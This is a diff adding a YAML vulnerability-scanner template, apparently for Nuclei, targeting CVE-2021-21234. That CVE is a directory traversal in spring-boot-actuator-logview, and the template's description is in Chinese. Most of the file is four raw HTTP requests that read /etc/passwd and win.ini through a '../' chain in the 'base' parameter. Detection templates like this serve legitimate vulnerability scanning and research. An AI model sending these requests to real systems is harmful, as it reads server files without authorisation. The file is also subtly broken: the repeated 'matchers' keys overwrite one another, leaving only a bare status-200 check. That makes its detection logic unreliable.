@@ -1,0 +1,63 @@
+id: Spring-2
+
+info:
+  name: Spring Boot Actuator logview 目录遍历漏洞
+  author: attempt
+  severity: high
+  description: |
+    spring-boot-actuator-logview 是一个简单的日志文件查看器作为Spring Boot执行器端点，在 0.2.13 版本之前存在着目录遍历漏洞，编号 CVE-2021-21234。漏洞本质是Spring Boot 执行器通过请求的参数来指定文件名和文件夹路径，经过组合拼接达到目录遍历，虽然源码中检查了文件名（filename）参数来防止目录遍历，但是没有检查文件夹（base）参数，造成了目录遍历
+  metadata:
+    verified: true
+    max-request: 1
+  tags: Spring,Spring Boot,目录遍历
+request:
+  - raw:
+      - |
+        GET /manage/log/view?filename=/windows/win.ini&base=../../../../../../../../../../ HTTP/1.1
+        Host: {{RootURL}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+      - |
+        GET /log/view?filename=/windows/win.ini&base=../../../../../../../../../../ HTTP/1.1
+        Host: {{RootURL}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+      - |
+        GET /manage/log/view?filename=/etc/passwd&base=../../../../../../../../../../ HTTP/1.1
+        Host: {{RootURL}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+      - |
+        GET /log/view?filename=/etc/passwd&base=../../../../../../../../../../ HTTP/1.1
+        Host: {{RootURL}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+    matchers-condition: or
+    matchers:
+      - type: status
+        part: status_0
+        status:
+          - 200
+    matchers:
+      - type: status
+        part: status_1
+        status:
+          - 200
+    matchers:
+      - type: status
+        part: status_2
+        status:
+          - 200
+    matchers:
+      - type: status
+        part: status_3
+        status:
+          - 200
